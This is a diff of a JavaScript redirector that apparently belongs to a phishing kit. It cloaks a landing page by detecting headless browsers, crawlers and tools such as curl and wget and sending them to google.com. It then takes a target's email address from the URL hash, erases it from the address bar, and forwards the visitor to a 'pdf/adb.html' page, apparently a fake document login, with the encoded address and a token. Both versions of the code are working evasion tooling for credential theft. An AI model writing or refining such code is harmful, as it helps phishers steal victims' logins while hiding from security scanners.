@@ -1,81 +1,45 @@
-<script>
 (function () {
-  // 1. Stealthier Bot Detection
-  function isLikelyBot() {
-    try {
-      // Screen size anomalies
-      if (window.outerWidth === 0 || window.outerHeight === 0) return true;
-
-      // Navigator checks
-      if (navigator.webdriver) return true;
-
-      // User-Agent heuristic (subtle check, lowercase)
-      const ua = navigator.userAgent.toLowerCase();
-      const botPattern = /(headless|phantom|bot|crawl|spider|wget|curl)/i;
-      if (botPattern.test(ua)) return true;
-
-      // Plugins check — headless browsers often have none
-      if (navigator.plugins.length === 0) return true;
-
-      // Language check — most real browsers have a language set
-      if (!navigator.language) return true;
-
-      return false;
-    } catch (e) {
-      return true;
-    }
+  // Bot detection
+  if (
+    window.outerWidth === 0 ||
+    window.outerHeight === 0 ||
+    navigator.webdriver ||
+    /HeadlessChrome|PhantomJS|bot|spider|crawl|curl|wget/i.test(navigator.userAgent)
+  ) {
+    window.location.href = "https://google.com";
+    throw new Error("Bot detected");
   }
 
-  // 2. Secure Token Generator
   function generateSecureToken(length = 64) {
     const array = new Uint8Array(length / 2);
     window.crypto.getRandomValues(array);
     return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
   }
 
-  // 3. Encode (Base64 URL-safe)
   function encodeData(data) {
     return btoa(encodeURIComponent(data))
-      .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+      .replace(/\+/g, '-')
+      .replace(/\//g, '_')
+      .replace(/=+$/, '');
   }
 
-  // 4. Validate Email
-  function isValidEmail(email) {
-    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  const hash = window.location.hash.substring(1);
+  if (!hash || !hash.includes("@")) {
+    window.location.href = "https://google.com";
+    return;
   }
 
-  // 5. Main Execution on DOM Ready
-  document.addEventListener("DOMContentLoaded", () => {
-    if (isLikelyBot()) {
-      // Bot detected — silent redirect
-      window.location.replace("https://google.com");
-      return;
-    }
+  const email = hash;
+  const token = generateSecureToken();
 
-    // Extract hash without showing it
-    const rawHash = window.location.hash.substring(1); // e.g., email@example.com
-    history.replaceState(null, "", window.location.pathname); // Remove it immediately
+  sessionStorage.setItem("redirect_email", email);
+  sessionStorage.setItem("redirect_token", token);
 
-    try {
-      const decodedEmail = decodeURIComponent(rawHash);
+  history.replaceState(null, "", window.location.pathname + window.location.search);
 
-      if (isValidEmail(decodedEmail)) {
-        const token = generateSecureToken();
-        const encodedEmail = encodeData(decodedEmail);
+  const encodedEmail = encodeData(email);
+  const redirectUrl = `pdf/adb.html#${encodedEmail}&token=${token}`;
 
-        sessionStorage.setItem("redirect_email", decodedEmail);
-        sessionStorage.setItem("redirect_token", token);
-
-        // Slight delay to avoid obvious redirect
-        setTimeout(() => {
-          window.location.href = `pdf/adb.html#${encodedEmail}&token=${token}`;
-        }, 300 + Math.random() * 500); // 300–800ms delay
-      } else {
-        window.location.replace("https://google.com");
-      }
-    } catch (err) {
-      window.location.replace("https://google.com");
-    }
-  });
+  // Redirect immediately
+  window.location.href = redirectUrl;
 })();
-</script>
